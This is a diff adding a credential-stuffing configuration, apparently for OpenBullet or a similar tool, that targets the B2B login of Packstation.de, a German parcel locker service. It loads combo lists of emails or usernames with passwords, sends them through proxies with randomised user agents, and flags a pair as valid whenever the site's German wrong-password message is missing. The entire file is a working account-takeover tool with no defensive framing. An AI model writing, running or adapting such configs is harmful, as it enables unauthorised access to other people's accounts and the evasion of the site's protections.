@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Packstation.de",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-25T17:14:12.5439914-08:00",
+  "AdditionalInfo": "",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Length FUNCTION Length "j_username=<USER>&j_password=<PASS>" -> VAR "Length" 
+
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#Login REQUEST POST "https://www.packstation.de/b2bgateway/j_security_check" 
+  CONTENT "j_username=<USER>&j_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.packstation.de" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.packstation.de/b2bgateway/login!load.action" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <Length>" 
+  HEADER "Origin: https://www.packstation.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Das von Ihnen eingegebene Passwort oder Ihr Benutzername ist falsch" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Das von Ihnen eingegebene Passwort oder Ihr Benutzername ist falsch" 
+
